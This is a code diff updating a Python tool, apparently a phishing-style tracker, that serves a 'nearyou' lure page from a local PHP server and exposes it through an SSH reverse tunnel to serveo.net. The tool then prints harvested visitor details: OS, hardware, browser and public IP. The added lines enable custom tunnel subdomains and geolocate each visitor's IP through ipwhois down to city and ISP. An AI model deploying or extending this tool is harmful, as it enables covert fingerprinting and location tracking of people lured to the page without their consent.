@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-from __future__ import print_function
 
 import os
 import sys
 import time
 import json
+import argparse
 import requests
 import subprocess as subp
 
@@ -14,15 +14,19 @@ G = '\033[32m' # green
 C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
-swd = os.getcwd()
-os.chdir(swd)
-result = '{}/template/nearyou/php/result.txt'.format(swd)
-info = '{}/template/nearyou/php/info.txt'.format(swd)
-site = 'nearyou'
-ver = '1.1.2'
+if sys.version_info[0] < 3:
+	print(R + '\n[-]' + C + ' Execute script with python3...\n' + W)
+	exit()
 
-if sys.version_info[0] >= 3:
-	raw_input = input
+parser = argparse.ArgumentParser()
+parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
+args = parser.parse_args()
+subdom = args.subdomain
+
+result = 'template/nearyou/php/result.txt'
+info = 'template/nearyou/php/info.txt'
+site = 'nearyou'
+version = '1.1.3'
 
 def banner():
 	os.system('clear')
@@ -34,31 +38,26 @@ def banner():
 /____  > \___  >\___  >|__|_ \ \___  >|__|
 	 \/      \/     \/      \/     \/        ''' + W)
 	print ('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
-	print (G + '[>]' + C + ' Version    : ' + W + ver + '\n')
-
-def network():
-	try:
-		requests.get('https://github.com/', timeout = 5)
-		print (G + '[+]' + C + ' Checking Internet Connection...' + W, end='')
-		print (G + ' Working' + W + '\n')
-	except requests.ConnectionError:
-		print (R + '[!]' + C + ' You are Not Connected to the Internet...Quiting...' + W)
-		sys.exit()
+	print (G + '[>]' + C + ' Version    : ' + W + version + '\n')
 
 def serveo():
-	global api, site, swd
+	global site, subdom
 	flag = False
-	print ('\n' + G + '[+]' + C + ' Starting PHP Server...' + W)
+	print (G + '[+]' + C + ' Starting PHP Server...' + W)
 	with open ('php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', '{}/template/'.format(swd)], stderr=phplog, stdout=phplog)
+		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stderr=phplog, stdout=phplog)
 
 	print ('\n' + G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
-	with open ('/tmp/serveo.txt', 'w') as tmpfile:
-		proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
-
+	if subdom is None:
+		with open ('serveo.txt', 'w') as tmpfile:
+			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
+	else:
+		with open ('serveo.txt', 'w') as tmpfile:
+			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
 	while True:
+		
 		time.sleep(2)
-		with open ('/tmp/serveo.txt', 'r') as tmpfile:
+		with open ('serveo.txt', 'r') as tmpfile:
 			try:
 				stdout = tmpfile.readlines()
 				if flag == False:
@@ -95,19 +94,30 @@ def main():
 			file2 = file2.read()
 			json3 = json.loads(file2)
 			for value in json3['dev']:
-				print (G + '[+]' + C + ' Device Information : ' + W + '\n')
-				print (G + '[+]' + C + ' OS         : ' + W + value['os'])
-				print (G + '[+]' + C + ' Platform   : ' + W + value['platform'])
+				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
+				print(G + '[+]' + C + ' OS         : ' + W + value['os'])
+				print(G + '[+]' + C + ' Platform   : ' + W + value['platform'])
 				try:
-					print (G + '[+]' + C + ' CPU Cores  : ' + W + value['cores'])
+					print(G + '[+]' + C + ' CPU Cores  : ' + W + value['cores'])
 				except TypeError:
 					pass
-				print (G + '[+]' + C + ' RAM        : ' + W + value['ram'])
-				print (G + '[+]' + C + ' GPU Vendor : ' + W + value['vendor'])
-				print (G + '[+]' + C + ' GPU        : ' + W + value['render'])
-				print (G + '[+]' + C + ' Resolution : ' + W + value['wd'] + 'x' + value['ht'])
-				print (G + '[+]' + C + ' Browser    : ' + W + value['browser'])
-				print (G + '[+]' + C + ' Public IP  : ' + W + value['ip'])
+				print(G + '[+]' + C + ' RAM        : ' + W + value['ram'])
+				print(G + '[+]' + C + ' GPU Vendor : ' + W + value['vendor'])
+				print(G + '[+]' + C + ' GPU        : ' + W + value['render'])
+				print(G + '[+]' + C + ' Resolution : ' + W + value['wd'] + 'x' + value['ht'])
+				print(G + '[+]' + C + ' Browser    : ' + W + value['browser'])
+				print(G + '[+]' + C + ' Public IP  : ' + W + value['ip'])
+				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(value['ip']))
+				sc = rqst.status_code
+				if sc == 200:
+					data = rqst.text
+					data = json.loads(data)
+					print(G + '[+]' + C + ' Continent  : ' + W + data['continent'])
+					print(G + '[+]' + C + ' Country    : ' + W + data['country'])
+					print(G + '[+]' + C + ' Region     : ' + W + data['region'])
+					print(G + '[+]' + C + ' City       : ' + W + data['city'])
+					print(G + '[+]' + C + ' Org        : ' + W + data['org'])
+					print(G + '[+]' + C + ' ISP        : ' + W + data['isp'])
 	except ValueError:
 		pass
 
@@ -170,7 +180,6 @@ def quit():
 
 try:
 	banner()
-	network()
 	serveo()
 	wait()
 	main()
